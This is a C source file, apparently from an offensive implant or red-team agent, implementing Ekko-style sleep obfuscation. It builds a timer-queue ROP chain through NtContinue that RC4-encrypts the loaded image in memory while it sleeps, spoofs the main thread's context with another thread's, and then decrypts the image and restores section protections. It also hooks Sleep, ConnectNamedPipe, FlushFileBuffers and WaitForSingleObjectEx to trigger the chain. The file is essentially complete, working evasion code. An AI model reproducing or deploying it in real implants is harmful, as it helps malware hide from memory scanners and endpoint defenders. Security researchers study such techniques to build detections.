#include "hooks.h"

/*
 * restore_section_permissions — walks the PE section table at g_ImageBase
 * and applies correct per-section page protections, then sets the PE header
 * as PAGE_READONLY. Called after Ekko decrypts the image to restore proper
 * permissions instead of a blanket PAGE_EXECUTE_READWRITE.
 */
static void restore_section_permissions(void)
{
    char * base = (char *)g_ImageBase;

    IMAGE_DOS_HEADER * dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS * nt  = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    DWORD section_count = nt->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER * sec = (IMAGE_SECTION_HEADER *)
        ((char *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    DWORD old_prot = 0;

    for (DWORD i = 0; i < section_count; i++, sec++) {
        void  *addr = base + sec->VirtualAddress;
        DWORD  size = sec->Misc.VirtualSize;
        if (size == 0)
            size = sec->SizeOfRawData;

        DWORD prot = 0;
        DWORD c    = sec->Characteristics;

        if (c & IMAGE_SCN_MEM_WRITE)
            prot = PAGE_READWRITE;
        if (c & IMAGE_SCN_MEM_READ)
            prot = PAGE_READONLY;
        if ((c & IMAGE_SCN_MEM_READ) && (c & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_READWRITE;
        if (c & IMAGE_SCN_MEM_EXECUTE)
            prot = PAGE_EXECUTE;
        if ((c & IMAGE_SCN_MEM_EXECUTE) && (c & IMAGE_SCN_MEM_WRITE))
            prot = PAGE_EXECUTE_READWRITE;
        if ((c & IMAGE_SCN_MEM_EXECUTE) && (c & IMAGE_SCN_MEM_READ))
            prot = PAGE_EXECUTE_READ;
        if ((c & IMAGE_SCN_MEM_READ) && (c & IMAGE_SCN_MEM_WRITE) && (c & IMAGE_SCN_MEM_EXECUTE))
            prot = PAGE_EXECUTE_READWRITE;

        if (prot != 0 && size > 0)
            KERNEL32$VirtualProtect(addr, size, prot, &old_prot);
    }

    /* PE header → read-only */
    KERNEL32$VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_prot);
    KERNEL32$FlushInstructionCache((HANDLE)(LONG_PTR)-1, base, g_ImageSize);

}


ULONG RndThreadId(ULONG CurrentThreadId) { 
    PVOID pBuffer = NULL;
    PSYSTEM_PROCESS_INFORMATION pCurrentProc = NULL;
    ULONG RandomThreadId = 0;
    ULONG ReturnLength = 0;
    ULONG TargetPid = (ULONG)KERNEL32$GetCurrentProcessId();

    // 1. Get the required size
    NTSTATUS status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &ReturnLength);
    if (status != STATUS_INFO_LENGTH_MISMATCH) return CurrentThreadId;

    // 2. Allocate and keep the base pointer for VirtualFree later
    pBuffer = KERNEL32$VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBuffer) return CurrentThreadId;

    status = NTDLL$NtQuerySystemInformation(SystemProcessInformation, pBuffer, ReturnLength, &ReturnLength);
    if (status != 0) {
        KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);
        return CurrentThreadId;
    }

    pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)pBuffer;

    // 3. Iterate through processes
    while (TRUE) {
        if ((ULONG_PTR)pCurrentProc->UniqueProcessId == (ULONG_PTR)TargetPid) {
            // Found our process, now look at its threads
            for (ULONG i = 0; i < pCurrentProc->NumberOfThreads; i++) {
                // Threads are located immediately after the process structure
                PSYSTEM_THREAD_INFORMATION pThread = &pCurrentProc->Threads[i];
                ULONG Tid = (ULONG)(ULONG_PTR)pThread->ClientId.UniqueThread;

                if (Tid != CurrentThreadId) {
                    RandomThreadId = Tid;
                    break; // Found one!
                }
            }
            break; 
        }

        if (pCurrentProc->NextEntryOffset == 0) break;
        
        // Move to the next process entry using the offset from the START of the current entry
        pCurrentProc = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pCurrentProc + pCurrentProc->NextEntryOffset);
    }

    // 4. Always free using the ORIGINAL base pointer
    KERNEL32$VirtualFree(pBuffer, 0, MEM_RELEASE);

    return (RandomThreadId != 0) ? RandomThreadId : CurrentThreadId;
}

VOID HandleUnexpectedError(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs, FLUSH_FILE_BUFFERS_ARGS *FFBArgs, WAIT_FOR_SINGLE_OBJECT_EX_ARGS *WFSOExArgs) {
    switch(Hook) {
        case SLEEP:
            KERNEL32$WaitForSingleObject(NtCurrentProcess(), Args->dwMilliseconds);
            break;
        case CONNECT_NAMED_PIPE:
            CnPArgs->OriginalFunc(CnPArgs->hNamedPipe, NULL);
            break;
        case FLUSH_FILE_BUFFERS:
            FFBArgs->OriginalFunc(FFBArgs->hFile);
            break;
        case WAIT_FOR_SINGLE_OBJECT_EX:
            WFSOExArgs->OriginalFunc(WFSOExArgs->hObject, WFSOExArgs->dwMilliseconds, WFSOExArgs->bAlertable);
            break;
    }
}

/*
 * EkkoObf — Ekko-style sleep obfuscation via timer queue ROP chain
 *
 * Flow (mirrors Kharon Timer pattern):
 *   Timer 0: RtlCaptureContext(&CtxThread) — capture timer-thread context
 *   Timer 1: SetEvent(hEvtCapture)         — signal capture is done
 *   Main:    WaitForSingleObject(hEvtCapture) — guaranteed capture
 *
 * ROP chain (all via NtContinue, staggered timers):
 *   ROP 0:  WaitForSingleObject(hEvtStart) — gate: block timer thread until main is ready
 *   ROP 1:  GetThreadContext(MainThread, &CtxBkp)   — backup main thread context
 *   ROP 2:  SetThreadContext(MainThread, &CtxSpf)   — spoof with random thread's context
 *   ROP 3:  VirtualProtect(ImageBase, ImageSize, PAGE_READWRITE)
 *   ROP 4:  SystemFunction032(Image, Key)           — RC4 encrypt in-place
 *   ROP 5:  WaitForSingleObject(CurrentProcess, SleepTime) — actual sleep
 *   ROP 6:  SystemFunction032(Image, Key)           — RC4 decrypt
 *   ROP 7:  VirtualProtect(ImageBase, ImageSize, PAGE_EXECUTE_READ)
 *   ROP 8:  SetThreadContext(MainThread, &CtxBkp)   — restore original context
 *   ROP 9:  SetEvent(hEvtEnd)                       — signal completion
 *
 * Main:     SetEvent(hEvtStart) + WaitForSingleObject(hEvtEnd) — trigger & wait
 */
VOID EkkoObf(HOOK_TYPE Hook, SLEEP_ARGS *Args, CONNECT_NAMED_PIPE_ARGS *CnPArgs, FLUSH_FILE_BUFFERS_ARGS *FFBArgs, WAIT_FOR_SINGLE_OBJECT_EX_ARGS *WFSOExArgs)
{
    ULONG  CurrentThreadId = KERNEL32$GetCurrentThreadId();
    ULONG  RandomThreadId  = RndThreadId(CurrentThreadId);

    MSVCRT$printf("[ekko] CurrentThreadId=%lu RandomThreadId=%lu\n", CurrentThreadId, RandomThreadId);

    HANDLE DupThreadHandle  = NULL;
    HANDLE MainThreadHandle = NULL;

    /* 11 contexts: captured + 10 ROP frames */
    CONTEXT CtxThread;
    CONTEXT RopWait;
    CONTEXT RopGetCtx;
    CONTEXT RopSetSpf;
    CONTEXT RopProtRW;
    CONTEXT RopMemEnc;
    CONTEXT RopDelay;
    CONTEXT RopMemDec;
    CONTEXT RopProtRX;
    CONTEXT RopRstCtx;
    CONTEXT RopSetEvt;

    CONTEXT CtxSpf;
    CONTEXT CtxBkp;

    MSVCRT$memset(&CtxThread, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopWait,   0, sizeof(CONTEXT));
    MSVCRT$memset(&RopGetCtx, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopSetSpf, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopProtRW, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopMemEnc, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopDelay,  0, sizeof(CONTEXT));
    MSVCRT$memset(&RopMemDec, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopProtRX, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopRstCtx, 0, sizeof(CONTEXT));
    MSVCRT$memset(&RopSetEvt, 0, sizeof(CONTEXT));

    MSVCRT$memset(&CtxSpf, 0, sizeof(CONTEXT));
    MSVCRT$memset(&CtxBkp, 0, sizeof(CONTEXT));

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvtCapture = NULL;   /* manual-reset: context capture sync    */
    HANDLE  hEvtStart   = NULL;   /* manual-reset: gate for ROP chain      */
    HANDLE  hEvtEnd     = NULL;   /* manual-reset: completion signal       */
    DWORD   OldProtect  = 0;
    DWORD   DelayTimer  = 0;

    /* RC4 key */
    CHAR    KeyBuf[16];
    MSVCRT$memset(KeyBuf, 0x55, 16);
    USTRING Key;
    USTRING Img ;

    MSVCRT$memset(&Key, 0, sizeof(USTRING));
    MSVCRT$memset(&Img, 0, sizeof(USTRING));

    if (!g_ImageBase || !g_ImageSize) {
        MSVCRT$printf("[ekko] ERROR: ImageBase or ImageSize not set, cannot proceed with obfuscation\n");
        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
        return;
    }

    /* ── resolve NtContinue, RtlCaptureContext, SystemFunction032 ── */
    HMODULE hNtdll  = KERNEL32$GetModuleHandleA("ntdll");
    HMODULE hAdvapi = KERNEL32$LoadLibraryA("Advapi32");


    fnNtContinue        pNtContinue       = (fnNtContinue)       KERNEL32$GetProcAddress(hNtdll,  "NtContinue");
    fnRtlCaptureContext pRtlCaptureContext = (fnRtlCaptureContext)KERNEL32$GetProcAddress(hNtdll,  "RtlCaptureContext");
    fnSystemFunction032 pSysFunc032        = (fnSystemFunction032)KERNEL32$GetProcAddress(hAdvapi, "SystemFunction032");

    if (!pNtContinue || !pRtlCaptureContext || !pSysFunc032) {
        MSVCRT$printf("[ekko] ERROR: failed to resolve required functions, cannot proceed with obfuscation\n");
        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
        return;
    }

    // MSVCRT$printf("[ekko] ImageBase=%p Size=0x%lx SleepTime=%lu ms\n", g_ImageBase, g_ImageSize, SleepTime);
    MSVCRT$printf("[ekko] current tid=%lu  spoof tid=%lu\n", CurrentThreadId, RandomThreadId);

    /* ── setup USTRING for SystemFunction032 ── */
    Key.Buffer = KeyBuf;
    Key.Length  = Key.MaximumLength = 16;
    Img.Buffer = g_ImageBase;
    Img.Length  = Img.MaximumLength = g_ImageSize;

    /* ── open the random thread for context spoofing ── */
    DupThreadHandle = KERNEL32$OpenThread(THREAD_ALL_ACCESS, FALSE, RandomThreadId);
    if (!DupThreadHandle) {
        MSVCRT$printf("[ekko] WARN: OpenThread(%lu) failed, skipping thread spoof\n", RandomThreadId);
    } else {
        MSVCRT$printf("[ekko] DupThreadHandle=%p (tid %lu)\n", DupThreadHandle, RandomThreadId);
    }

    /* ── duplicate current thread handle ── */
    KERNEL32$DuplicateHandle(
        NtCurrentProcess(),
        NtCurrentThread(),
        NtCurrentProcess(),
        &MainThreadHandle,
        THREAD_ALL_ACCESS,
        FALSE,
        0
    );

    if (!MainThreadHandle) {
        MSVCRT$printf("[ekko] ERROR: DuplicateHandle for main thread failed, cannot proceed with obfuscation\n");
        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
        return;
    }

    MSVCRT$printf("[ekko] MainThreadHandle=%p\n", MainThreadHandle);

    /* ── create 3 manual-reset events (like Kharon EventTimer/EventStart/EventEnd) ── */
    hEvtCapture = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    hEvtStart   = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    hEvtEnd     = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);   /* manual-reset */
    hTimerQueue = KERNEL32$CreateTimerQueue();

    if (!hEvtCapture || !hEvtStart || !hEvtEnd || !hTimerQueue) {
        MSVCRT$printf("[ekko] ERROR: failed to create events/timer queue\n");
        if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
        if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
        if (hEvtCapture) KERNEL32$CloseHandle(hEvtCapture);
        if (hEvtStart)   KERNEL32$CloseHandle(hEvtStart);
        if (hEvtEnd)     KERNEL32$CloseHandle(hEvtEnd);
        if (hTimerQueue) KERNEL32$DeleteTimerQueue(hTimerQueue);

        MSVCRT$printf("[ekko] falling back to original function\n");
        HandleUnexpectedError(Hook, Args, CnPArgs, FFBArgs, WFSOExArgs);
        return;
    }
    MSVCRT$printf("[ekko] events and timer queue created\n");

    /* ── capture spoof thread context ── */
    CtxSpf.ContextFlags = CONTEXT_ALL;
    CtxBkp.ContextFlags = CONTEXT_ALL;

    if (DupThreadHandle) {
        BOOL ok = KERNEL32$GetThreadContext(DupThreadHandle, &CtxSpf);
        MSVCRT$printf("[ekko] GetThreadContext(spoof) = %d  Rip=%p Rsp=%p\n", ok, (PVOID)CtxSpf.Rip, (PVOID)CtxSpf.Rsp);
    }

    /* ── step 0: capture timer-thread context via two timed callbacks ── */
    /*    Timer A: RtlCaptureContext(&CtxThread)                         */
    /*    Timer B: SetEvent(hEvtCapture) — signals capture is complete   */
    KERNEL32$CreateTimerQueueTimer(
        &hNewTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)pRtlCaptureContext,
        &CtxThread,
        DelayTimer += 100,
        0,
        WT_EXECUTEINTIMERTHREAD
    );
    
    KERNEL32$CreateTimerQueueTimer(
        &hNewTimer,
        hTimerQueue,
        (WAITORTIMERCALLBACK)KERNEL32$SetEvent,
        hEvtCapture,
        DelayTimer += 100,
        0,
        WT_EXECUTEINTIMERTHREAD
    );

    MSVCRT$printf("[ekko] waiting for timer-thread context capture...\n");
    KERNEL32$WaitForSingleObject(hEvtCapture, INFINITE);
    MSVCRT$printf("[ekko] timer-thread context captured: Rip=%p Rsp=%p\n", (PVOID)CtxThread.Rip, (PVOID)CtxThread.Rsp);

    /* ── clone captured context into every ROP frame ── */
    MSVCRT$memcpy(&RopWait,   &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopGetCtx, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopSetSpf, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopMemEnc, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopDelay,  &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopMemDec, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopRstCtx, &CtxThread, sizeof(CONTEXT));
    MSVCRT$memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

    /* adjust stack for each frame (simulate CALL push of return address) */
    RopWait.Rsp   -= 8;
    RopGetCtx.Rsp -= 8;
    RopSetSpf.Rsp -= 8;
    RopProtRW.Rsp -= 8;
    RopMemEnc.Rsp -= 8;
    RopDelay.Rsp  -= 8;
    RopMemDec.Rsp -= 8;
    RopProtRX.Rsp -= 8;
    RopRstCtx.Rsp -= 8;
    RopSetEvt.Rsp -= 8;

    /* ── ROP 0: WaitForSingleObject(hEvtStart, INFINITE) — gate ── */
    RopWait.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
    RopWait.Rcx = (DWORD64)hEvtStart;
    RopWait.Rdx = (DWORD64)INFINITE;

    /* ── ROP 1: GetThreadContext(MainThread, &CtxBkp) — backup ── */
    RopGetCtx.Rip = (DWORD64)KERNEL32$GetThreadContext;
    RopGetCtx.Rcx = (DWORD64)MainThreadHandle;
    RopGetCtx.Rdx = (DWORD64)&CtxBkp;

    /* ── ROP 2: SetThreadContext(MainThread, &CtxSpf) — spoof ── */
    RopSetSpf.Rip = (DWORD64)KERNEL32$SetThreadContext;
    RopSetSpf.Rcx = (DWORD64)MainThreadHandle;
    RopSetSpf.Rdx = (DWORD64)&CtxSpf;

    /* ── ROP 3: VirtualProtect → PAGE_READWRITE ── */
    RopProtRW.Rip = (DWORD64)KERNEL32$VirtualProtect;
    RopProtRW.Rcx = (DWORD64)g_ImageBase;
    RopProtRW.Rdx = (DWORD64)g_ImageSize;
    RopProtRW.R8  = PAGE_READWRITE;
    RopProtRW.R9  = (DWORD64)&OldProtect;

    /* ── ROP 4: SystemFunction032 → encrypt ── */
    RopMemEnc.Rip = (DWORD64)pSysFunc032;
    RopMemEnc.Rcx = (DWORD64)&Img;
    RopMemEnc.Rdx = (DWORD64)&Key;

    switch (Hook) {
        case SLEEP:
            MSVCRT$printf("[ekko] sleep obfuscation: Sleep(%lu ms)\n", Args->dwMilliseconds);
                /* ── ROP 5: WaitForSingleObject → sleep ── */
            RopDelay.Rip = (DWORD64)KERNEL32$WaitForSingleObject;
            RopDelay.Rcx = (DWORD64)NtCurrentProcess();
            RopDelay.Rdx = (DWORD64)Args->dwMilliseconds;
            break;
        case CONNECT_NAMED_PIPE:
            MSVCRT$printf("[ekko] sleep obfuscation: ConnectNamedPipe(%p, %p)\n", CnPArgs->hNamedPipe, CnPArgs->lpOverlapped);
                /* ── ROP 5: ConnectNamedPipe ── */
            RopDelay.Rip = (DWORD64)CnPArgs->OriginalFunc;
            RopDelay.Rcx = (DWORD64)CnPArgs->hNamedPipe;
            RopDelay.Rdx = (DWORD64)CnPArgs->lpOverlapped;
            break;
        case WAIT_FOR_SINGLE_OBJECT_EX:
             /* ── ROP 5: WaitForSingleObjectEx ── */
            RopDelay.Rip = (DWORD64)WFSOExArgs->OriginalFunc;
            RopDelay.Rcx = (DWORD64)WFSOExArgs->hObject;
            RopDelay.Rdx = (DWORD64)WFSOExArgs->dwMilliseconds;
            RopDelay.R8  = (DWORD64)WFSOExArgs->bAlertable;
            break;

        case FLUSH_FILE_BUFFERS:
            MSVCRT$printf("[ekko] sleep obfuscation: FlushFileBuffers(%p)\n", FFBArgs->hFile);
             /* ── ROP 5: FlushFileBuffers ── */
            RopDelay.Rip = (DWORD64)FFBArgs->OriginalFunc;
            RopDelay.Rcx = (DWORD64)FFBArgs->hFile;
            break;
        default:
            MSVCRT$printf("[ekko] sleep obfuscation: unknown hook type %d\n", Hook);
    }

    /* ── ROP 6: SystemFunction032 → decrypt ── */
    RopMemDec.Rip = (DWORD64)pSysFunc032;
    RopMemDec.Rcx = (DWORD64)&Img;
    RopMemDec.Rdx = (DWORD64)&Key;

    /* ── ROP 7: restore_section_permissions ── */
    RopProtRX.Rip = (DWORD64)restore_section_permissions;

    /* ── ROP 8: SetThreadContext(MainThread, &CtxBkp) — restore ── */
    RopRstCtx.Rip = (DWORD64)KERNEL32$SetThreadContext;
    RopRstCtx.Rcx = (DWORD64)MainThreadHandle;
    RopRstCtx.Rdx = (DWORD64)&CtxBkp;

    /* ── ROP 9: SetEvent(hEvtEnd) — signal done ── */
    RopSetEvt.Rip = (DWORD64)KERNEL32$SetEvent;
    RopSetEvt.Rcx = (DWORD64)hEvtEnd;

    MSVCRT$printf("[ekko] queuing ROP chain (10 steps)...\n");

    /* queue each context frame via NtContinue, staggered 100ms apart */
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopWait,   DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopGetCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetSpf, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRW, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemEnc, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopDelay,  DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopMemDec, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopProtRX, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopRstCtx, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);
    KERNEL32$CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)pNtContinue, &RopSetEvt, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD);

    MSVCRT$printf("[ekko] all timers queued (total delay=%lu ms). triggering gate...\n", DelayTimer);

    /* ── trigger: signal the gate, then wait for completion ── */
    KERNEL32$SetEvent(hEvtStart);
    MSVCRT$printf("[ekko] gate signaled, waiting for ROP chain to complete...\n");
    KERNEL32$WaitForSingleObject(hEvtEnd, INFINITE);

    MSVCRT$printf("[ekko] sleep obfuscation complete\n");

    /* ── cleanup ── */
    if (DupThreadHandle)  KERNEL32$CloseHandle(DupThreadHandle);
    if (MainThreadHandle) KERNEL32$CloseHandle(MainThreadHandle);
    KERNEL32$CloseHandle(hEvtCapture);
    KERNEL32$CloseHandle(hEvtStart);
    KERNEL32$CloseHandle(hEvtEnd);
    KERNEL32$DeleteTimerQueue(hTimerQueue);
    MSVCRT$printf("[ekko] cleanup done\n");
}

/*
 * Sleep hook — Ekko sleep obfuscation
 * When the DLL calls Sleep(), we encrypt its memory, wait, then decrypt.
 */
VOID _Sleep(DWORD dwMilliseconds) {
    SLEEP_ARGS Args = { dwMilliseconds };
    if ( dwMilliseconds <= 1000 ) {
        MSVCRT$printf("[hook] Sleep(%lu ms) - below threshold, skipping obfuscation\n", dwMilliseconds);
        KERNEL32$WaitForSingleObject(NtCurrentProcess(), dwMilliseconds);
        return;
    }
    MSVCRT$printf("[hook] Sleep(%lu ms) -> Ekko sleep obfuscation\n", dwMilliseconds);
    EkkoObf(SLEEP, &Args, NULL, NULL, NULL);

}

BOOL _ConnectNamedPipe(HANDLE hNamedPipe, LPOVERLAPPED lpOverlapped) {
    MSVCRT$printf("[hook] ConnectNamedPipe called - simulating success\n");
    fnConnectNamedPipe original_ConnectNamedPipe = (fnConnectNamedPipe)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "ConnectNamedPipe");

    if (original_ConnectNamedPipe) {
        CONNECT_NAMED_PIPE_ARGS CnPArgs = { hNamedPipe, lpOverlapped, original_ConnectNamedPipe };
        EkkoObf(CONNECT_NAMED_PIPE, NULL, &CnPArgs, NULL, NULL);
        return TRUE; // Simulate success without actually calling the original function
    } else {
        MSVCRT$printf("[hook] ERROR: original ConnectNamedPipe not found\n");
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return FALSE;
    }

}

BOOL _FlushFileBuffers(HANDLE hFile) {
    MSVCRT$printf("[hook] FlushFileBuffers called - simulating success\n");
    fnFlushFileBuffers original_FlushFileBuffers = (fnFlushFileBuffers)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "FlushFileBuffers");

    if (original_FlushFileBuffers) {
        FLUSH_FILE_BUFFERS_ARGS FFBArgs = { hFile, original_FlushFileBuffers };
        EkkoObf(FLUSH_FILE_BUFFERS, NULL, NULL, &FFBArgs, NULL);
        return TRUE; // Simulate success without actually calling the original function
    } else {
        MSVCRT$printf("[hook] ERROR: original FlushFileBuffers not found\n");
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return FALSE;
    }
}

DWORD _WaitForSingleObjectEx(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable) {
    MSVCRT$printf("[hook] WaitForSingleObjectEx called - simulating wait\n");
    // For simplicity, we'll just call the original WaitForSingleObjectEx without obfuscation
    fnWaitForSingleObjectEx original_WaitForSingleObjectEx = (fnWaitForSingleObjectEx)KERNEL32$GetProcAddress(KERNEL32$GetModuleHandleA("kernel32.dll"), "WaitForSingleObjectEx");

    if (original_WaitForSingleObjectEx) {
        // return original_WaitForSingleObjectEx(hHandle, dwMilliseconds, bAlertable);
        WAIT_FOR_SINGLE_OBJECT_EX_ARGS WaitArgs = { hHandle, dwMilliseconds, bAlertable, original_WaitForSingleObjectEx };
        EkkoObf(WAIT_FOR_SINGLE_OBJECT_EX, NULL, NULL, NULL, &WaitArgs);
        return WAIT_OBJECT_0; // Simulate that the wait completed successfully
    } else {
        MSVCRT$printf("[hook] ERROR: original WaitForSingleObjectEx not found\n");
        KERNEL32$SetLastError(ERROR_INVALID_FUNCTION);
        return WAIT_FAILED;
    }
}